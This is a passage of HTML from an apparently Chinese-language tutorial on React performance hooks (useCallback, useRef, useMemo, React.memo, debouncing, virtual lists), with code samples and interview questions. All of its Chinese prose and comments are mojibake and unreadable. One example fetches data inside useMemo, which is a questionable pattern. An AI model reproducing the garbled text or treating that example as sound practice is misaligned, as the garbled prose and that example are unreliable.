= <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æäº¤:&#x27;</span>, text);<br>  &#125;, [text]); <span class="hljs-comment">// æ­£ç¡®æ•è·æœ€æ–°text</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">keyHandler</span> = e =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;Enter&#x27;</span>) <span class="hljs-title function_">handleSubmit</span>();<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, keyHandler);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, keyHandler);<br>  &#125;, [handleSubmit]); <span class="hljs-comment">// ä¾èµ–ç¨³å®šå‡½æ•°</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½é™·é˜±</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šè¿‡åº¦ä½¿ç”¨ useCallback</span><br><span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;ç‚¹å‡»&#x27;</span>);<br>&#125;, []); <span class="hljs-comment">// ç®€å•å‡½æ•°ä¸éœ€è¦ç¼“å­˜</span><br><br><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šç›´æ¥å®šä¹‰å‡½æ•°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;ç‚¹å‡»&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="useRef-é«˜çº§ç”¨æ³•ï¼ˆè¡¥å……-2-5-ç« èŠ‚ï¼‰"><a href="#useRef-é«˜çº§ç”¨æ³•ï¼ˆè¡¥å……-2-5-ç« èŠ‚ï¼‰" class="headerlink" title="useRef é«˜çº§ç”¨æ³•ï¼ˆè¡¥å…… 2.5 ç« èŠ‚ï¼‰"></a>useRef é«˜çº§ç”¨æ³•ï¼ˆè¡¥å…… 2.5 ç« èŠ‚ï¼‰</h3><p><strong>ä¿å­˜å¯å˜å€¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Timer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// &#123; current: 0 &#125;</span><br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    countRef.<span class="hljs-property">current</span> += <span class="hljs-number">1</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;è®¡æ•°:&#x27;</span>, countRef.<span class="hljs-property">current</span>);<br>  &#125;;<br>  <br>  <span class="hljs-comment">// ä¸è§¦å‘é‡æ¸²æŸ“ï¼</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è®¿é—®ä¸Šä¸€çŠ¶æ€</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">const</span> prevCountRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    prevCountRef.<span class="hljs-property">current</span> = count; <span class="hljs-comment">// æ¸²æŸ“åä¿å­˜å½“å‰å€¼</span><br>  &#125;);<br>  <br>  <span class="hljs-keyword">const</span> prevCount = prevCountRef.<span class="hljs-property">current</span>;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      å½“å‰: &#123;count&#125;, ä¹‹å‰: &#123;prevCount&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è·¨æ¸²æŸ“å‘¨æœŸå­˜å‚¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatRoom</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [messages, setMessages] = <span class="hljs-title function_">useState</span>([]);<br>  <span class="hljs-keyword">const</span> socketRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    socketRef.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://...&#x27;</span>);<br>    socketRef.<span class="hljs-property">current</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>      <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">msgs</span> =&gt;</span> [...msgs, event.<span class="hljs-property">data</span>]);<br>    &#125;;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> socketRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">close</span>();<br>  &#125;, []);<br>  <br>  <span class="hljs-comment">// åœ¨å…¶ä»–å‡½æ•°ä¸­ä½¿ç”¨</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = (<span class="hljs-params">text</span>) =&gt; &#123;<br>    socketRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">send</span>(text);<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-11"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-11" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šuseMemo å’Œ useCallback æœ‰ä½•åŒºåˆ«ï¼Ÿ</strong></p><p>æ ¸å¿ƒåŒºåˆ«ï¼š</p><ul><li>useMemo ç¼“å­˜è®¡ç®—ç»“æœï¼Œç”¨äºé¿å…é‡å¤è®¡ç®—</li><li>useCallback ç¼“å­˜å‡½æ•°å¼•ç”¨ï¼Œç”¨äºä¿æŒå¼•ç”¨ç¨³å®š</li></ul><p>ç­‰æ•ˆå…³ç³»ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useCallback</span>(fn, deps) === <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> fn, deps)<br></code></pre></td></tr></table></figure><p><strong>Qï¼šä½•æ—¶è¯¥ç”¨ useMemo&#x2F;useCallbackï¼Ÿ</strong></p><pre class="mermaid">graph TD  A[éœ€è¦ä¼˜åŒ–?] -->|å¦| B[ç›´æ¥è®¡ç®—/å®šä¹‰å‡½æ•°]  A -->|æ˜¯| C{ä¼˜åŒ–ç±»å‹?}  C -->|é¿å…è®¡ç®—å¼€é”€| D[ç”¨useMemo]  C -->|é¿å…å­ç»„ä»¶é‡æ¸²æŸ“| E[useCallback+React.memo]  C -->|ç¨³å®šä¾èµ–é¡¹| F[ä¸¤è€…çš†å¯]</pre><p><strong>Qï¼šuseRef å’Œ useState æœ‰ä½•åŒºåˆ«ï¼Ÿ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">useRef</th><th align="left">useState</th></tr></thead><tbody><tr><td align="left">è§¦å‘é‡æ¸²æŸ“</td><td align="left">å¦</td><td align="left">æ˜¯</td></tr><tr><td align="left">å­˜å‚¨å€¼ç±»å‹</td><td align="left">å¯å˜å¯¹è±¡ï¼ˆ.currentï¼‰</td><td align="left">ä¸å¯å˜çŠ¶æ€</td></tr><tr><td align="left">æ•°æ®æŒä¹…åŒ–</td><td align="left">ç»„ä»¶ç”Ÿå‘½å‘¨æœŸ</td><td align="left">çŠ¶æ€æ›´æ–°ä¿ç•™</td></tr><tr><td align="left">å…¸å‹ç”¨é€”</td><td align="left">DOM å¼•ç”¨&#x2F;è®¡æ—¶å™¨ ID</td><td align="left">æ¸²æŸ“ç›¸å…³çŠ¶æ€</td></tr><tr><td align="left">åˆå§‹åŒ–</td><td align="left">useRef(initial)</td><td align="left">useState(initial)</td></tr></tbody></table><h3 id="é«˜çº§ä¼˜åŒ–æ¨¡å¼"><a href="#é«˜çº§ä¼˜åŒ–æ¨¡å¼" class="headerlink" title="é«˜çº§ä¼˜åŒ–æ¨¡å¼"></a>é«˜çº§ä¼˜åŒ–æ¨¡å¼</h3><p><strong>è™šæ‹Ÿæ»šåŠ¨ä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">VirtualList</span>(<span class="hljs-params">&#123; items, itemHeight &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> containerRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> [visibleRange, setVisibleRange] = <span class="hljs-title function_">useState</span>([<span class="hljs-number">0</span>, <span class="hljs-number">10</span>]);<br>  <br>  <span class="hljs-comment">// ç¼“å­˜å¯è§é¡¹</span><br>  <span class="hljs-keyword">const</span> visibleItems = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">slice</span>(visibleRange[<span class="hljs-number">0</span>], visibleRange[<span class="hljs-number">1</span>]);<br>  &#125;, [items, visibleRange]);<br>  <br>  <span class="hljs-comment">// è®¡ç®—æ€»é«˜åº¦ï¼ˆè™šæ‹Ÿæ»šåŠ¨ï¼‰</span><br>  <span class="hljs-keyword">const</span> totalHeight = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> items.<span class="hljs-property">length</span> * itemHeight;<br>  &#125;, [items.<span class="hljs-property">length</span>, itemHeight]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;containerRef&#125;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">height:</span> &#x27;<span class="hljs-attr">500px</span>&#x27;, <span class="hljs-attr">overflow:</span> &#x27;<span class="hljs-attr">auto</span>&#x27; &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">height:</span> `$&#123;<span class="hljs-attr">totalHeight</span>&#125;<span class="hljs-attr">px</span>`, <span class="hljs-attr">position:</span> &#x27;<span class="hljs-attr">relative</span>&#x27; &#125;&#125;&gt;</span></span><br><span class="language-xml">        &#123;visibleItems.map(item =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Item</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.id&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">item</span>=<span class="hljs-string">&#123;item&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">position:</span> &#x27;<span class="hljs-attr">absolute</span>&#x27;,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">top:</span> `$&#123;<span class="hljs-attr">item.index</span> * <span class="hljs-attr">itemHeight</span>&#125;<span class="hljs-attr">px</span>` </span></span><br><span class="hljs-tag"><span class="language-xml">            &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é˜²æŠ–&#x2F;èŠ‚æµä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useDebounce</span>(<span class="hljs-params">value, delay</span>) &#123;<br>  <span class="hljs-keyword">const</span> [debouncedValue, setDebouncedValue] = <span class="hljs-title function_">useState</span>(value);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setDebouncedValue</span>(value), delay);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer);<br>  &#125;, [value, delay]);<br>  <br>  <span class="hljs-keyword">return</span> debouncedValue;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Search</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [query, setQuery] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> debouncedQuery = <span class="hljs-title function_">useDebounce</span>(query, <span class="hljs-number">300</span>);<br>  <br>  <span class="hljs-comment">// ä½¿ç”¨useMemoé¿å…é‡å¤è¯·æ±‚</span><br>  <span class="hljs-keyword">const</span> results = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchResults</span>(debouncedQuery);<br>  &#125;, [debouncedQuery]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;query&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> setQuery(e.target.value)&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Results</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;results&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“ï¼šæ€§èƒ½ä¼˜åŒ–å†³ç­–"><a href="#æ€»ç»“ï¼šæ€§èƒ½ä¼˜åŒ–å†³ç­–" class="headerlink" title="æ€»ç»“ï¼šæ€§èƒ½ä¼˜åŒ–å†³ç­–"></a>æ€»ç»“ï¼šæ€§èƒ½ä¼˜åŒ–å†³ç­–</h3><pre class="mermaid">graph TD  A[æ€§èƒ½é—®é¢˜?] -->|æ˜¯| B{é—®é¢˜ç±»å‹}  A -->|å¦| C[æ— éœ€ä¼˜åŒ–]  B -->|ç»„ä»¶é‡æ¸²æŸ“è¿‡å¤š| D[React.memo+useCallback]  B -->|è®¡ç®—å¼€é”€å¤§| E[useMemo]  B -->|DOMæ“ä½œé¢‘ç¹| F[useRef+useLayoutEffect]  D --> G[éªŒè¯ä¼˜åŒ–æ•ˆæœ]  E --> G  F --> G  G -->|è§£å†³| H[åœæ­¢]  G -->|æœªè§£å†³| I[æ€§èƒ½åˆ†æå·¥å…·]</pre><h1 id="ç¬¬å››ç« ï¼šReact-é«˜çº§ç‰¹æ€§"><a href="#ç¬¬å››ç« ï¼šReact-é«˜çº§ç‰¹æ€§" class="headerlink" title="ç¬¬å››ç« ï¼šReact é«˜çº§ç‰¹æ€§"></a>ç¬¬å››ç« ï¼šReact é«˜çº§ç‰¹æ€§</h1><h2 id="4-1-æ€§èƒ½ä¼˜åŒ–ï¼ˆReact-memoã€useMemoã€useCallbackï¼‰"><a href="#4-1-æ€§èƒ½ä¼˜åŒ–ï¼ˆReact-memoã€useMemoã€useCallbackï¼‰" class="headerlink" title="4.1 æ€§èƒ½ä¼˜åŒ–ï¼ˆReact.memoã€useMemoã€useCallbackï¼‰"></a>4.1 æ€§èƒ½ä¼˜åŒ–ï¼ˆReact.memoã€useMemoã€useCallbackï¼‰</h2><h3 id="æ€§èƒ½ä¼˜åŒ–æ ¸å¿ƒåŸåˆ™"><a href="#æ€§èƒ½ä¼˜åŒ–æ ¸å¿ƒåŸåˆ™" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–æ ¸å¿ƒåŸåˆ™"></a>æ€§èƒ½ä¼˜åŒ–æ ¸å¿ƒåŸåˆ™</h3><p><strong>React æ¸²æŸ“æœºåˆ¶å›é¡¾</strong></p><pre class="mermaid">graph LRA[çŠ¶æ€/Propså˜åŒ–] --> B[ç»„ä»¶é‡æ–°æ¸²æŸ“]B --> C{å­ç»„ä»¶æ˜¯å¦æ›´æ–°?}C -->|Propså˜åŒ–| D[é‡æ–°æ¸²æŸ“å­ç»„ä»¶]C -->|Propsæœªå˜åŒ–| E[è·³è¿‡å­ç»„ä»¶æ¸²æŸ“]</pre><p><strong>æ€§èƒ½ä¼˜åŒ–æ ¸å¿ƒç­–ç•¥</strong></p><table><thead><tr><th align="left">ä¼˜åŒ–ç­–ç•¥</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">å®ç°æ–¹å¼</th></tr></thead><tbody><tr><td align="left">å‡å°‘æ¸²æŸ“æ¬¡æ•°</td><td align="left">é¿å…ä¸å¿…è¦çš„æ¸²æŸ“</td><td align="left">React.memoã€PureComponent</td></tr><tr><td align="left">å‡å°‘è®¡ç®—é‡</td><td align="left">å¤æ‚è®¡ç®—&#x2F;æ•°æ®è½¬æ¢</td><td align="left">useMemo</td></tr><tr><td align="left">ä¿æŒå¼•ç”¨ç¨³å®š</td><td align="left">å‡½æ•°&#x2F;å¯¹è±¡ä½œä¸ºä¾èµ–é¡¹</td><td align="left">useCallbackã€useMemo</td></tr><tr><td align="left">è™šæ‹ŸåŒ–é•¿åˆ—è¡¨</td><td align="left">å¤§æ•°æ®é‡æ¸²æŸ“</td><td align="left">react-windowã€react-virtualized</td></tr></tbody></table><h3 id="æ ¸å¿ƒ-API-æ·±åº¦è§£æ"><a href="#æ ¸å¿ƒ-API-æ·±åº¦è§£æ" class="headerlink" title="æ ¸å¿ƒ API æ·±åº¦è§£æ"></a>æ ¸å¿ƒ API æ·±åº¦è§£æ</h3><p><strong>React.memo è¯¦è§£</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸºç¡€ç”¨æ³•</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">/* ä½¿ç”¨ props æ¸²æŸ“ */</span><br>&#125;);<br><br><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserProfile</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; user, settings &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&#123;user.avatar&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Preferences</span> <span class="hljs-attr">options</span>=<span class="hljs-string">&#123;settings&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;, <span class="hljs-function">(<span class="hljs-params">prevProps, nextProps</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// ä»…åœ¨ user.id æˆ– settings.theme å˜åŒ–æ—¶é‡æ–°æ¸²æŸ“</span><br>  <span class="hljs-keyword">return</span> prevProps.<span class="hljs-property">user</span>.<span class="hljs-property">id</span> === nextProps.<span class="hljs-property">user</span>.<span class="hljs-property">id</span> &amp;&amp; <br>         prevProps.<span class="hljs-property">settings</span>.<span class="hljs-property">theme</span> === nextProps.<span class="hljs-property">settings</span>.<span class="hljs-property">theme</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p>å…³é”®ç‰¹æ€§ï¼š</p><ul><li>ä»…è¿›è¡Œæµ…æ¯”è¾ƒï¼ˆshallow compareï¼‰</li><li>æ¯”è¾ƒå‡½æ•°è¿”å› true è¡¨ç¤ºä¸éœ€è¦é‡æ–°æ¸²æŸ“</li><li>é€‚ç”¨äºå‡½æ•°ç»„ä»¶</li></ul><p>ä¼˜åŒ–åœºæ™¯ï¼š</p><ul><li>çº¯å±•ç¤ºå‹ç»„ä»¶ï¼ˆæ— å†…éƒ¨çŠ¶æ€ï¼‰</li><li>æ¥æ”¶å¤æ‚å¯¹è±¡ Props çš„ç»„ä»¶</li><li>ä½äºæ¸²æŸ“é¢‘ç¹ç»„ä»¶æ ‘ä¸­çš„å¶å­èŠ‚ç‚¹</li></ul><p><strong>useMemo æ·±åº¦åº”ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductList</span>(<span class="hljs-params">&#123; products, filterText, sortBy &#125;</span>) &#123;<br>  <span class="hljs-comment">// ç¼“å­˜å¤æ‚è®¡ç®—ç»“æœ</span><br>  <span class="hljs-keyword">const</span> filteredProducts = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;é‡æ–°è®¡ç®—è¿‡æ»¤äº§å“&#x27;</span>);<br>    <span class="hljs-keyword">return</span> products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <br>      p.<span class="hljs-property">name</span>.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(filterText.<span class="hljs-title function_">toLowerCase</span>())<br>    );<br>  &#125;, [products, filterText]); <span class="hljs-comment">// ä¾èµ–é¡¹</span><br>  <br>  <span class="hljs-comment">// ç¼“å­˜æ’åºç»“æœ</span><br>  <span class="hljs-keyword">const</span> sortedProducts = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;é‡æ–°æ’åºäº§å“&#x27;</span>);<br>    <span class="hljs-keyword">return</span> [...filteredProducts].<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (sortBy === <span class="hljs-string">&#x27;price&#x27;</span>) <span class="hljs-keyword">return</span> a.<span class="hljs-property">price</span> - b.<span class="hljs-property">price</span>;<br>      <span class="hljs-keyword">return</span> a.<span class="hljs-property">name</span>.<span class="hljs-title function_">localeCompare</span>(b.<span class="hljs-property">name</span>);<br>    &#125;);<br>  &#125;, [filteredProducts, sortBy]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">      &#123;sortedProducts.map(product =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ProductItem</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;product.id&#125;</span> <span class="hljs-attr">product</span>=<span class="hljs-string">&#123;product&#125;</span> /&gt;</span></span><br><span class="language-xml">      ))&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®ç‰¹æ€§ï¼š</p><ul><li>ç¼“å­˜è®¡ç®—ç»“æœï¼Œé¿å…é‡å¤è®¡ç®—</li><li>ä¾èµ–é¡¹å˜åŒ–æ—¶é‡æ–°è®¡ç®—</li><li>é€‚ç”¨äºï¼šå¤æ‚è®¡ç®—ã€æ•°æ®è½¬æ¢ã€ç»„ä»¶è®°å¿†åŒ–</li></ul><p>æ€§èƒ½é™·é˜±ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 